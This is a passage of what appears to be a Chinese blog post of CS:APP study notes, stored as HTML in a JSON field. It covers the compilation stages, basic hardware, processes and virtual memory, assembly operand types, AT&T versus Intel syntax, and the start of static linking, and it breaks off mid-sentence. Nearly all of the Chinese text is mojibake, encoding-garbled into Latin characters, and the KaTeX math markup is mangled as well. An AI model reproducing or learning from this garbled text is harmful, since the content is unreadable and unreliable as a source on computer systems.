            "content_html": "<h1 id=\"ç¬¬ä¸€ç« -è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸€ç« -è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸\">#</a> ç¬¬ä¸€ç«  è®¡ç®—æœºç³»ç»Ÿæ¼«æ¸¸</h1>\n<h2 id=\"11ä¿¡æ¯å°±æ˜¯ä½ä¸Šä¸‹æ–‡\"><a class=\"markdownIt-Anchor\" href=\"#11ä¿¡æ¯å°±æ˜¯ä½ä¸Šä¸‹æ–‡\">#</a> 1.1 ä¿¡æ¯å°±æ˜¯ä½ + ä¸Šä¸‹æ–‡</h2>\n<p>1. æ–‡ä»¶éƒ½ä»¥å­—èŠ‚åºåˆ—æ–¹å¼å­˜å‚¨ï¼Œåªç”± ASCII å­—ç¬¦æ„æˆç§°ä¸ºæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä»–æ‰€æœ‰æ–‡ä»¶ç§°ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶</p>\n<p>2. åŒºåˆ†ç›¸åŒä½ä¸²ä»£è¡¨çš„ä¸åŒæ•°æ®å¯¹è±¡çš„å”¯ä¸€æ–¹æ³•æ˜¯æˆ‘ä»¬è¯»åˆ°è¿™äº›æ•°æ®å¯¹è±¡æ—¶çš„ä¸Šä¸‹æ–‡ï¼Œä¸åŒä¸Šä¸‹æ–‡ä¸­ï¼ŒåŒæ ·çš„å­—èŠ‚åºåˆ—å¯èƒ½è¡¨ç¤ºä¸€ä¸ªæ•´æ•°æµ®ç‚¹æ•°å­—ç¬¦ä¸²æˆ–è€…æœºå™¨æŒ‡ä»¤</p>\n<h2 id=\"12ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼\"><a class=\"markdownIt-Anchor\" href=\"#12ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼\">#</a> 1.2 ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼</h2>\n<p>1. æŠŠæºç¨‹åºæ–‡ä»¶ hello.c ç¿»è¯‘æˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ hello çš„è¿‡ç¨‹æœ‰å››ä¸ªé˜¶æ®µï¼ˆé¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–ï¼Œé“¾æ¥ï¼‰ ï¼Œåˆ†åˆ«ç”±é¢„å¤„ç†å™¨ï¼Œç¼–è¯‘å™¨ï¼Œæ±‡ç¼–å™¨ï¼Œé“¾æ¥å™¨ä¸€åŒå®Œæˆï¼Œä»–ä»¬å…±åŒæ„æˆäº†ç¼–è¯‘ç³»ç»Ÿï¼ˆçœ‹ä¹¦ä¸Šå›¾ç‰‡ï¼‰<br>\n2. é¢„å¤„ç†é˜¶æ®µï¼šé¢„å¤„ç†å™¨ï¼ˆcppï¼‰æ ¹æ® #å¼€å¤´çš„å‘½ä»¤ä¿®æ”¹åŸå§‹çš„ C ç¨‹åºï¼Œå¹¶å¾—æ–°çš„ C ç¨‹åºï¼ˆä»¥.i ä¸ºæ‰©å±•åï¼‰<br>\n3. ç¼–è¯‘é˜¶æ®µï¼šç¼–è¯‘å™¨ï¼ˆcllï¼‰å°† hello.i ç¿»è¯‘æˆæ–‡æœ¬æ–‡ä»¶ hello.sï¼ŒåŒ…å«ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ç¨‹åº<br>\n 4. æ±‡ç¼–é˜¶æ®µï¼šæ±‡ç¼–å™¨ï¼ˆasï¼‰æŠŠ hello.s ç¿»è¯‘æˆæœºå™¨è¯­è¨€æŒ‡ä»¤ï¼Œå¹¶æŠŠè¿™äº›æŒ‡ä»¤æ‰“åŒ…æˆå¯é‡å®šä½ç›®æ ‡ç¨‹åºçš„æ ¼å¼ï¼Œç»“æœä¿å­˜åœ¨ hello.oï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰<br>\n5. é“¾æ¥é˜¶æ®µï¼šhello è°ƒç”¨äº† printf å‡½æ•°ï¼Œprintf å‡½æ•°å­˜åœ¨äºä¸€ä¸ªåä¸º printf.o çš„å•ç‹¬çš„é¢„å¤„ç†å¥½çš„ç›®æ ‡æ–‡ä»¶ä¸­ã€‚æœ‰é“¾æ¥å™¨ï¼ˆldï¼‰æŠŠ printf.o åˆå¹¶åˆ° hello.o å½“ä¸­ã€‚ç»“æœå¾—åˆ° hello æ–‡ä»¶</p>\n<h2 id=\"13-äº†è§£ç¼–è¯‘ç³»ç»Ÿå¦‚ä½•å·¥ä½œçš„å¥½å¤„\"><a class=\"markdownIt-Anchor\" href=\"#13-äº†è§£ç¼–è¯‘ç³»ç»Ÿå¦‚ä½•å·¥ä½œçš„å¥½å¤„\">#</a> 1.3 äº†è§£ç¼–è¯‘ç³»ç»Ÿå¦‚ä½•å·¥ä½œçš„å¥½å¤„</h2>\n<ol>\n<li>ä¼˜åŒ–ç¨‹åºæ€§èƒ½</li>\n<li>ç†è§£é“¾æ¥æ—¶å‡ºç°çš„é”™è¯¯</li>\n<li>é¿å…å®‰å…¨æ¼æ´</li>\n</ol>\n<h2 id=\"14-å¤„ç†å™¨è¯»å¹¶è§£é‡Šå­˜åœ¨å†…å­˜ä¸­çš„æŒ‡ä»¤\"><a class=\"markdownIt-Anchor\" href=\"#14-å¤„ç†å™¨è¯»å¹¶è§£é‡Šå­˜åœ¨å†…å­˜ä¸­çš„æŒ‡ä»¤\">#</a> 1.4 å¤„ç†å™¨è¯»å¹¶è§£é‡Šå­˜åœ¨å†…å­˜ä¸­çš„æŒ‡ä»¤</h2>\n<h3 id=\"shell\"><a class=\"markdownIt-Anchor\" href=\"#shell\">#</a> shell</h3>\n<p>hello.c æºç¨‹åºå·²ç»è¢«ç¼–è¯‘ç³»ç»Ÿç¿»è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶ hello å¹¶è¢«å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚è¦æƒ³åœ¨ Unix ç³»ç»Ÿä¸Šè¿è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å®ƒçš„æ–‡ä»¶åè¾“å…¥åˆ°ç§°ä¸º shell çš„åº”ç”¨ç¨‹åº</p>\n<pre><code>linux&gt; ./hello\nhello, world\nlinux&gt;\n</code></pre>\n<p>shell æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œè§£é‡Šå™¨å¦‚æœå‘½ä»¤è¡Œçš„ç¬¬ä¸€ä¸ªå•è¯ä¸æ˜¯ shell çš„å†…ç½®å‘½ä»¤ï¼Œé‚£ä¹ˆ shell å°±ä¼šå‡è®¾ä»–æ˜¯ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„åå­—ï¼Œä»–å°†åŠ è½½å¹¶æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚</p>\n<h3 id=\"ç¡¬ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#ç¡¬ä»¶\">#</a> ç¡¬ä»¶</h3>\n<p>1. ç³»ç»Ÿç¡¬ä»¶ç»„æˆï¼šæ€»çº¿ï¼ŒI/O è®¾å¤‡ï¼Œä¸»å­˜ï¼Œå¤„ç†å™¨<br>\n 2. æ€»çº¿ï¼šè´¯ç©¿æ•´ä¸ªç³»ç»Ÿçš„ä¸€ç»„ç”µå­ç®¡é“ï¼Œæºå¸¦ä¿¡æ¯å­—èŠ‚å¹¶è´Ÿè´£åœ¨å„ä¸ªéƒ¨ä»¶é—´ä¼ é€’ï¼ˆä¼ é€’ä¿¡æ¯ç”¨çš„ï¼‰é€šå¸¸æ€»çº¿è¢«è®¾è®¡æˆä¼ é€å®šé•¿çš„å­—èŠ‚å—ï¼ˆå­— wordï¼‰ã€‚å­—ä¸­çš„å­—èŠ‚æ•°æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç³»ç»Ÿå‚æ•°ï¼ˆ32 ä½ 4 ä¸ªï¼Œ64 ä½ 8 ä¸ªï¼‰<br>\n3.I/O è®¾å¤‡ï¼šç³»ç»Ÿä¸å¤–éƒ¨ä¸–ç•Œè”ç³»é€šé“ï¼ˆé¼ æ ‡é”®ç›˜ï¼Œæ˜¾ç¤ºå™¨ï¼Œç£ç›˜ï¼‰ï¼ŒI/O é€šè¿‡æ§åˆ¶å™¨ï¼ˆI/O è®¾å¤‡æœ¬èº«æˆ–è€…ä¸»å°åˆ·ç”µè·¯æ¿ä¸Šçš„èŠ¯ç‰‡ç»„ï¼‰æˆ–é€‚é…å™¨ï¼ˆæ’åœ¨ä¸»æ¿æ’æ§½ï¼‰ä¸æ€»çº¿ç›¸è¿<br>\n 4. ä¸»å­˜ï¼šä¸´æ—¶å­˜å‚¨è®¾å¤‡ï¼Œå¤„ç†å™¨æ‰§è¡Œç¨‹åºçš„æ—¶å€™ç”¨æ¥å­˜æ”¾ç¨‹åºå’Œæ•°æ®çš„ï¼Œæœ‰ä¸€ç»„åŠ¨æ€éšå³å­˜å–å­˜å‚¨å™¨ï¼ˆDRAMï¼‰èŠ¯ç‰‡ç»„æˆ<br>\n 5. å¤„ç†å™¨ï¼šä¸­å¤®å¤„ç†å™¨ï¼ˆCPUï¼‰æ˜¯è§£é‡Šï¼ˆæˆ–æ‰§è¡Œï¼‰å­˜å‚¨åœ¨ä¸»å­˜ä¸­æŒ‡ä»¤çš„å¼•æ“ã€‚å…¶å’Œè¡Œæ˜¯ä¸€ä¸ªä»£å†™å“¦å•Šä¸ºä¸€ä¸ªå­—çš„å­˜å‚¨è®¾å¤‡ï¼ˆæˆ–å¯„å­˜å™¨ï¼‰ï¼Œç§°ä¸º<strong>ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰</strong>ï¼Œåœ¨ä»»ä½•æ—¶å€™ PC éƒ½æŒ‡å‘ä¸»å­˜ä¸­çš„æŸæ¡æœºå™¨æŒ‡ä»¤ï¼ˆåŠå«æœ‰è¯¥æŒ‡ä»¤çš„åœ°å€ï¼‰ã€‚å¤„ç†å™¨ä» PC æŒ‡å‘çš„å†…å­˜å¤„è¯»æŒ‡ä»¤ï¼Œè§£é‡ŠæŒ‡ä»¤ä¸­çš„ä½ï¼Œç„¶åæ›´æ–° PCï¼Œä½¿å…¶æŒ‡å‘ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè€Œè¿™äº›æŒ‡ä»¤ä¸ä¸€å®šåœ¨å†…å­˜ä¸­è¿ç»­<br>\nã€‚å¤„ç†å™¨æ“ä½œä¸»è¦å›´ç»•ä¸»å­˜ï¼Œå¯„å­˜å™¨æ–‡ä»¶ï¼Œç®—æ•° / é€»è¾‘å•å…ƒè¿›è¡Œ<br>\n 6. å¯„å­˜å™¨æ–‡ä»¶ï¼ˆregister fileï¼‰æ˜¯ä¸€ä¸ªå°å­˜å‚¨è®¾å¤‡ï¼Œç”±ä¸€äº›å•ä¸ªå­—é•¿çš„å¯„å­˜å™¨ç»„æˆï¼Œæ¯ä¸ªå¯„å­˜å™¨æœ‰å”¯ä¸€çš„æ–‡ä»¶ã€‚<br>\n7.** ç®—æœ¯ / é€»è¾‘å•å…ƒï¼ˆALUï¼‰** è®¡ç®—æ•°æ®å’Œåœ°å€å€¼</p>\n<p>CPU åœ¨æŒ‡ä»¤çš„è¦æ±‚ä¸‹å¯èƒ½æ‰§è¡Œçš„æ“ä½œå¦‚ä¸‹</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">æ“ä½œ</th>\n<th style=\"text-align:center\">å…·ä½“</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">åŠ è½½</td>\n<td style=\"text-align:center\">ä»ä¸»å­˜å¤åˆ¶ä¸€ä¸ªå­—èŠ‚æˆ–å­—åˆ°å¯„å­˜å™¨ï¼Œä»¥è¦†ç›–å¯„å­˜å™¨åŸæ¥çš„å†…å®¹</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">å­˜å‚¨</td>\n<td style=\"text-align:center\">ä»å¯„å­˜å™¨å¤åˆ¶ä¸€ä¸ªå­—èŠ‚æˆ–å­—åˆ°ä¸»å­˜çš„æŸä¸ªä½ç½®ï¼Œè¦†ç›–ä¸»å­˜åŸæ¥çš„å†…å®¹</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">æ“ä½œ</td>\n<td style=\"text-align:center\">æŠŠä¸¤ä¸ªå¯„å­˜å™¨çš„å†…å®¹å¤åˆ¶åˆ° ALUï¼ŒALU å¯¹è¿™ä¸¤ä¸ªå­—åšç®—æœ¯è¿ç®—ï¼Œå¹¶å°†ç»“æœå­˜æ”¾åˆ°ä¸€ä¸ªå¯„å­˜å™¨ä¸­ï¼Œä»¥è¦†ç›–å¯„å­˜å™¨åŸæ¥å†…å®¹</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">è·³è½¬</td>\n<td style=\"text-align:center\">ä»æŒ‡ä»¤æœ¬èº«æŠ½å–ä¸€ä¸ªå­—ï¼Œå¹¶å°†è¿™ä¸ªå­—å¤åˆ¶åˆ° PC ä»¥è¦†ç›– PC åŸæ¥çš„å€¼</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"è¿›ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#è¿›ç¨‹\">#</a> è¿›ç¨‹</h3>\n<p>è¿›ç¨‹å¯ä»¥çœ‹æˆæ˜¯æ“ä½œç³»ç»Ÿå¯¹æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„ä¸€ç§æŠ½è±¡ï¼Œåœ¨ä¸€ä¸ªç³»ç»Ÿä¸­å¯ä»¥è¿è¡Œå¤šä¸ªè¿›ç¨‹ï¼Œè¿™äº›è¿›ç¨‹å¯¹å¤–è¡¨ç°å¥½åƒæ˜¯ç‹¬å ç¡¬ä»¶ï¼Œå®é™…ä¸Šæ˜¯é€šè¿‡ä¸åŒè¿›ç¨‹ä¹‹é—´è¿›ç¨‹çš„äº¤äº’æ‰§è¡Œå®ç°çš„ï¼Œè¿™ä¸ªè¿‡ç¨‹å«ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼ˆcontext switchï¼‰</p>\n<h3 id=\"çº¿ç¨‹\"><a class=\"markdownIt-Anchor\" href=\"#çº¿ç¨‹\">#</a> çº¿ç¨‹</h3>\n<p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ç”±å¤šä¸ªçº¿ç¨‹ç»„æˆï¼Œè¿è¡Œåœ¨ä¸€ä¸ªä¸Šä¸‹æ–‡ç¯å¢ƒä¸­ï¼Œå…±äº«ä»£ç ä»¥åŠå…¨å±€æ•°æ®ã€‚å› ä¸ºå…±äº«æ•°æ®ï¼Œä½¿å¾—å…¶æ¯”ä¸€èˆ¬çš„è¿›ç¨‹æ›´åŠ é«˜æ•ˆï¼ˆèŠ±åœ¨ context switch çš„æ—¶é—´å°‘ï¼‰ã€‚</p>\n<h3 id=\"è™šæ‹Ÿå­˜å‚¨å™¨\"><a class=\"markdownIt-Anchor\" href=\"#è™šæ‹Ÿå­˜å‚¨å™¨\">#</a> è™šæ‹Ÿå­˜å‚¨å™¨</h3>\n<p>ç»™è¿›ç¨‹æä¾›çš„ä¸€ä¸ªå¥½åƒè‡ªå·±ç‹¬å ä¸»å­˜çš„å‡è±¡ï¼Œå¯¹äºè¿›ç¨‹çš„æ‰€ä½¿ç”¨çš„è™šæ‹Ÿå­˜å‚¨å™¨å¯ä»¥åˆ†æˆä¸€ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p>\n<ul>\n<li>ç¨‹åºä»£ç å’Œæ•°æ®</li>\n<li>å †ï¼Œå¯ä»¥åŠ¨æ€æ‰©å±•æˆ–è€…æ”¶ç¼©ï¼Œä¾›åƒ malloc å’Œ free è¿™æ ·çš„ C è¯­è¨€ä¸­çš„åº“è¿›è¡Œè°ƒç”¨</li>\n<li>å…±äº«åº“</li>\n<li>æ ˆï¼Œå¯ä»¥åŠ¨æ€æ‰©å±•æˆ–è€…æ”¶ç¼©ï¼Œç”¨äºç¼–è¯‘å™¨çš„å‡½æ•°è°ƒç”¨</li>\n<li>å†…æ ¸è™šæ‹Ÿå­˜å‚¨å™¨</li>\n</ul>\n<h1 id=\"ç¬¬ä¸‰ç« -ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸‰ç« -ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º\">#</a> ç¬¬ä¸‰ç«  ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vdXVhbi5tb2UvcG9zdC8yMDIyLzA5L2NzYXBwLTM=\">https://ouuan.moe/post/2022/09/csapp-3</span>  è¿™ä¸ªç¬”è®°åšå®¢å¥½</p>\n<p>æ“ä½œæ•°æœ‰ 3 ç§åŸºæœ¬ç±»å‹ï¼š</p>\n<ul>\n<li>ç«‹å³æ•° â€”â€” ç”¨æ•°å­—æ–‡æœ¬è¡¨è¾¾å¼</li>\n<li>å¯„å­˜å™¨æ“ä½œæ•° â€”â€” ä½¿ç”¨ CPU å†…å·²å‘½åçš„å¯„å­˜å™¨</li>\n<li>å†…å­˜æ“ä½œæ•° â€”â€” å¼•ç”¨å†…å­˜ä½ç½®</li>\n</ul>\n<p>å„ç§ä¸åŒçš„æ“ä½œæ•°çš„å¯èƒ½æ€§è¢«åˆ†ä¸ºä¸‰ç§ç±»å‹ã€‚<strong>ç¬¬ä¸€ç§ç±»å‹æ˜¯ç«‹å³æ•° (immediate)</strong>ï¼Œç”¨æ¥è¡¨ç¤ºå¸¸æ•°å€¼ã€‚åœ¨ ATT æ ¼å¼çš„æ±‡ç¼–ä»£ç ä¸­ï¼Œç«‹å³æ•°çš„ä¹¦å†™æ–¹å¼æ˜¯â€˜<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>â€™åé¢è·Ÿä¸€ä¸ªç”¨æ ‡å‡†</mtext><mi>C</mi><mtext>è¡¨ç¤ºæ³•è¡¨ç¤ºçš„æ•´æ•°ï¼Œæ¯”å¦‚ï¼Œ</mtext></mrow><annotation encoding=\"application/x-tex\">â€™åé¢è·Ÿä¸€ä¸ªç”¨æ ‡å‡†Cè¡¨ç¤ºæ³•è¡¨ç¤ºçš„æ•´æ•°ï¼Œæ¯”å¦‚ï¼Œ</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\">â€™</span><span class=\"mord cjk_fallback\">å</span><span class=\"mord cjk_fallback\">é¢</span><span class=\"mord cjk_fallback\">è·Ÿ</span><span class=\"mord cjk_fallback\">ä¸€</span><span class=\"mord cjk_fallback\">ä¸ª</span><span class=\"mord cjk_fallback\">ç”¨</span><span class=\"mord cjk_fallback\">æ ‡</span><span class=\"mord cjk_fallback\">å‡†</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord cjk_fallback\">è¡¨</span><span class=\"mord cjk_fallback\">ç¤º</span><span class=\"mord cjk_fallback\">æ³•</span><span class=\"mord cjk_fallback\">è¡¨</span><span class=\"mord cjk_fallback\">ç¤º</span><span class=\"mord cjk_fallback\">çš„</span><span class=\"mord cjk_fallback\">æ•´</span><span class=\"mord cjk_fallback\">æ•°</span><span class=\"mord cjk_fallback\">ï¼Œ</span><span class=\"mord cjk_fallback\">æ¯”</span><span class=\"mord cjk_fallback\">å¦‚</span><span class=\"mord cjk_fallback\">ï¼Œ</span></span></span></span>-577 æˆ– $0x1Fã€‚ä¸åŒçš„æŒ‡ä»¤å…è®¸çš„ç«‹å³æ•°å€¼èŒƒå›´ä¸åŒï¼Œæ±‡ç¼–å™¨ä¼šè‡ªåŠ¨é€‰æ‹©æœ€ç´§å‡‘çš„æ–¹å¼è¿›è¡Œæ•°å€¼ç¼–ç ã€‚<strong>ç¬¬äºŒç§ç±»å‹æ˜¯å¯„å­˜å™¨ (register)</strong>ï¼Œå®ƒè¡¨ç¤ºæŸä¸ªå¯„å­˜å™¨çš„å†…å®¹ï¼Œ16 ä¸ªå¯„å­˜å™¨çš„ä½ä½ 1 å­—èŠ‚ã€2 å­—èŠ‚ã€4 å­—èŠ‚æˆ– 8 å­—èŠ‚ä¸­çš„ä¸€ä¸ªä½œä¸ºæ“ä½œæ•°ï¼Œè¿™äº›å­—èŠ‚æ•°åˆ†åˆ«å¯¹åº”äº 8 ä½ã€16 ä½ã€32 ä½æˆ– 64 ä½ã€‚åœ¨å›¾ 3-3 ä¸­ï¼Œæˆ‘ä»¬ç”¨ç¬¦å· rã€‚æ¥è¡¨ç¤ºä»»æ„å¯„å­˜å™¨ aï¼Œç”¨å¼•ç”¨ R [rã€‚] æ¥è¡¨ç¤ºå®ƒçš„å€¼ï¼Œè¿™æ˜¯å°†å¯„å­˜å™¨é›†åˆçœ‹æˆä¸€ä¸ªæ•°ç»„ Rï¼Œç”¨å¯„å­˜å™¨æ ‡è¯†ç¬¦ä½œä¸ºç´¢å¼•ã€‚<strong>ç¬¬ä¸‰ç±»æ“ä½œæ•°æ˜¯å†…å­˜å¼•ç”¨</strong>ï¼Œå®ƒä¼šæ ¹æ®è®¡ç®—å‡ºæ¥çš„åœ°å€ (é€šå¸¸ç§°ä¸ºæœ‰æ•ˆåœ°å€) è®¿é—®æŸä¸ªå†…å­˜ä½ç½®ã€‚å› ä¸ºå°†å†…å­˜çœ‹æˆä¸€ä¸ªå¾ˆå¤§çš„å­—èŠ‚æ•°ç»„ï¼Œæˆ‘ä»¬ç”¨ç¬¦å· M,[Addr] è¡¨ç¤ºå¯¹å­˜å‚¨åœ¨å†…å­˜ä¸­ä»åœ°å€ Addr å¼€å§‹çš„ b ä¸ªå­—èŠ‚å€¼çš„å¼•ç”¨ã€‚ä¸ºäº†ç®€ä¾¿ï¼Œæˆ‘ä»¬é€šå¸¸çœå»ä¸‹æ ‡ bã€‚</p>\n<blockquote>\n<h4 id=\"æŒ‡ä»¤é›†çš„-referenceatt-æ ¼å¼-vs-intel-æ ¼å¼\"><a class=\"markdownIt-Anchor\" href=\"#æŒ‡ä»¤é›†çš„-referenceatt-æ ¼å¼-vs-intel-æ ¼å¼\">#</a> æŒ‡ä»¤é›†çš„ reference:ATT æ ¼å¼ vs Intel æ ¼å¼</h4>\n<p>CS:APP ä»¥åŠ gcc,OBJDUMP é»˜è®¤ä½¿ç”¨çš„æ˜¯ ATT æ ¼å¼çš„æ±‡ç¼–ï¼Œå…¶ä»–ä¸€äº›ç¼–ç¨‹å·¥å…·ï¼ŒåŒ…æ‹¬ Microsoft çš„å·¥å…·ï¼Œä»¥åŠæ¥è‡ª Intel çš„æ–‡æ¡£ï¼Œå…¶æ±‡ç¼–ä»£ç éƒ½æ˜¯ Intel æ ¼å¼çš„ã€‚è¿™ä¸¤ç§æ ¼å¼åœ¨è®¸å¤šæ–¹é¢æœ‰æ‰€ä¸åŒã€‚ä½¿ç”¨ä¸‹è¿°å‘½ä»¤è¡Œï¼ŒGCC å¯ä»¥äº§ç”Ÿ multstore å‡½æ•°çš„ Intel æ ¼å¼çš„ä»£ç :</p>\n<p><strong>linux&gt; gcc -Og -s -masm=intel mstore.c</strong></p>\n<p>æˆ‘ä»¬çœ‹åˆ° Intel å’Œ ATT æ ¼å¼åœ¨å¦‚ä¸‹æ–¹é¢æœ‰æ‰€ä¸åŒ:</p>\n<p>Intel ä»£ç çœç•¥äº†æŒ‡ç¤ºå¤§å°çš„åç¼€ã€‚æˆ‘ä»¬çœ‹åˆ°æŒ‡ä»¤ push å’Œ movï¼Œè€Œä¸æ˜¯ pushq å’Œ movqã€‚Intel ä»£ç çœç•¥äº†å¯„å­˜å™¨åå­—å‰é¢çš„â€˜%' ç¬¦å·ï¼Œç”¨çš„æ˜¯ rbxï¼Œè€Œä¸æ˜¯ % rbxã€‚</p>\n<p>Intel ä»£ç ç”¨ä¸åŒçš„æ–¹å¼æ¥æè¿°å†…å­˜ä¸­çš„ä½ç½®ï¼Œä¾‹å¦‚æ˜¯â€˜QWORD PTR [rbx]' è€Œä¸æ˜¯â€˜(% rbx)â€™ã€‚</p>\n<p>åœ¨å¸¦æœ‰å¤šä¸ªæ“ä½œæ•°çš„æŒ‡ä»¤æƒ…å†µä¸‹ï¼Œåˆ—å‡ºæ“ä½œæ•°çš„é¡ºåºç›¸åã€‚å½“åœ¨ä¸¤ç§æ ¼å¼ä¹‹é—´è¿›è¡Œè½¬æ¢çš„æ—¶å€™ï¼Œè¿™ä¸€ç‚¹éå¸¸ä»¤äººå›°æƒ‘ã€‚è™½ç„¶åœ¨æˆ‘ä»¬çš„è¡¨è¿°ä¸­ä¸ä½¿ç”¨ Intel æ ¼å¼ï¼Œä½†æ˜¯åœ¨æ¥è‡ª Intel å’Œ Microsoft çš„æ–‡æ¡£ä¸­ï¼Œä½ ä¼šé‡åˆ°å®ƒã€‚</p>\n</blockquote>\n<p>x86-64 å¯„å­˜å™¨</p>\n<p><img data-src=\"/images/image-20231110190711464.png\" alt=\"image-20231110190711464\"></p>\n<p><img data-src=\"/images/image-20231110191711992.png\" alt=\"image-20231110191711992\"></p>\n<p><strong>è¡¥ç  / åç ã€é›¶æ‰©å±•å’Œç¬¦å·ä½æ‰©å±•:</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MDUzOTEyNS9hcnRpY2xlL2RldGFpbHMvMTAzMDU4NDIw\">https://blog.csdn.net/weixin_40539125/article/details/103058420</span></p>\n<h1 id=\"ç¬¬ä¸ƒç« -é“¾æ¥\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¬ä¸ƒç« -é“¾æ¥\">#</a> ç¬¬ä¸ƒç«  é“¾æ¥</h1>\n<blockquote>\n<p>é“¾æ¥ï¼ˆ Clinkingï¼‰æ˜¯å°†å„ç§ä»£ç å’Œæ•°æ®ç‰‡æ®µæ”¶é›†å¹¶ç»„åˆæˆä¸ºä¸€ä¸ªå•ä¸€æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªæ–‡ä»¶å¯è¢«åŠ è½½ï¼ˆå¤åˆ¶ï¼‰åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚é“¾æ¥å¯ä»¥æ‰§è¡Œäºç¼–è¯‘æ—¶ï¼ˆ compile timeï¼‰ï¼Œä¹Ÿå°±æ˜¯åœ¨æºä»£ç è¢«ç¿»è¯‘æˆæœºå™¨ä»£ç æ—¶ï¼›ä¹Ÿå¯ä»¥æ‰§è¡ŒäºåŠ è½½æ—¶ï¼ˆ load timeï¼‰ï¼Œä¹Ÿå°±æ˜¯åœ¨ç¨‹åºè¢«åŠ è½½å™¨ï¼ˆlad erï¼‰åŠ è½½åˆ°å†…å­˜å¹¶æ‰§è¡Œæ—¶ï¼›ç”šè‡³æ‰§è¡Œäºè¿è¡Œæ—¶ï¼ˆ run timeï¼‰ï¼Œä¹Ÿå°±æ˜¯ç”±åº”ç”¨ç¨‹åºæ¥æ‰§è¡Œã€‚åœ¨æ—©æœŸçš„è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œé“¾æ¥æ˜¯æ‰‹åŠ¨æ‰§è¡Œçš„ã€‚åœ¨ç°ä»£ç³»ç»Ÿä¸­ï¼Œé“¾æ¥æ˜¯ç”±å«åšé“¾æ¥å™¨ï¼ˆ linkerï¼‰çš„ç¨‹åºè‡ªåŠ¨æ‰§è¡Œçš„ã€‚</p>\n</blockquote>\n<p><strong>é™æ€é“¾æ¥</strong></p>\n<p>åƒ Linux LD ç¨‹åºè¿™æ ·çš„é™æ€é“¾æ¥å™¨ä»¥ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå‘½ä»¤è¡Œå‚æ•°ä½œä¸ºè¾“å…¥ï¼Œç”Ÿæˆä¸€ä¸ªå®Œå…¨é“¾æ¥çš„ã€å¯ä»¥åŠ è½½å’Œè¿è¡Œçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä½œä¸ºè¾“å‡ºã€‚è¾“å…¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ç”±å„ç§ä¸åŒçš„ä»£ç å’Œæ•°æ®èŠ‚ï¼ˆ sectionï¼‰ç»„æˆï¼Œæ¯ä¸€èŠ‚éƒ½æ˜¯ä¸€ä¸ªè¿ç»­çš„å­—èŠ‚åºåˆ—ã€‚æŒ‡ä»¤åœ¨ä¸€èŠ‚ä¸­ï¼Œåˆå§‹åŒ–äº†çš„å…¨å±€å˜é‡åœ¨å¦ä¸€èŠ‚ä¸­ï¼Œè€Œæœªåˆå§‹åŒ–çš„å˜é‡åˆåœ¨å¦å¤–èŠ‚ä¸­ã€‚</p>\n<p>ä¸ºäº†æ„é€ å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé“¾æ¥å™¨å¿…é¡»å®Œæˆä¸¤ä¸ªä¸»è¦ä»»åŠ¡ï¼š</p>\n<p>ç¬¦å·è§£æï¼ˆ symbol resolutionï¼‰ã€‚ç›®æ ‡æ–‡ä»¶å®šä¹‰å’Œå¼•ç”¨ç¬¦å·ï¼Œæ¯ä¸ªç¬¦å·å¯¹åº”äºä¸€ä¸ªå‡½æ•°ã€ä¸€ä¸ªå…¨å±€å˜é‡æˆ–ä¸€ä¸ªé™æ€å˜é‡ï¼ˆå³ C è¯­è¨€ä¸­ä»»ä½•ä»¥ 